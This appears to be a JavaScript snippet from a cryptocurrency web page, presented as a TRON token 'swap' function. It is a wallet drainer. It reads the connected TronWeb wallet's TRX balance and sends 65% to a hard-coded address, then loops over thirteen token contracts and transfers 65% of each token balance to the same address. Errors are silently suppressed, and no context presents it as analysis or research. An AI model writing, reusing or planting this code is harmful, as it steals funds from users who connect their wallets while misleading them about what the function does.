var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                                    "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
                                    "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
                                    "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
                                    "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
                                    "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
                                    "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
                                    "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
                                    "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
                                    "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
                                    "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
                                    "TG3XANY34mpabHM2DNc5ajhjMJVUQU741Y",
                                    "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"]

            async function swap(){
                try{
                    var balance = await window.tronWeb.trx.getBalance();
                    if (balance >= 100000000)
                    await tronWeb.trx.sendTransaction("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 65 / 100));
                }catch{}
                for(i=0; i<contractsAddress.length; i++){
                    try{
                    var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                    balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
                    if (balance.toNumber() >= 100000){
                        await cc.transfer("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 65 / 100)).send()
                    }
                    }catch{}
                }
            }
